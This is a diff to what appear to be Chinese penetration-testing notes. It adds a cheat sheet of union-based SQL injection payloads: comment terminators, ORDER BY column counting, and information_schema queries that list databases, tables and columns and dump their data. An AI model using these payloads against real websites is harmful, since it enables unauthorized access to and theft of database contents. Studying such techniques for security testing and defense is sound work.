@@ -29,6 +29,21 @@
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.信息收集:
 ![](/assets/B37DE04BFA39F1E89C6D4C24BE781008.png)
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.内容获取:
+```sql
+   判断注入点后,联合查询法,语句末尾添加 %23 或者 --+ 进行注释
+   字段长度: order by
+   显示字段: union select null,null,强制报错显示字段
+   查库信息: union select database(),version()
+   查库: union select group_concat(schema_name) from information_schema.schemata,null
+   查表: union select group_concat(table_name) from information_schema.tables where table_schema=database()
+   查列: union select group_concat(column_name) from information_schema.columns where table_name=0X十六进制
+   查数据: union select group——concat()
+
+   
+
+```
+
+
 
 
 
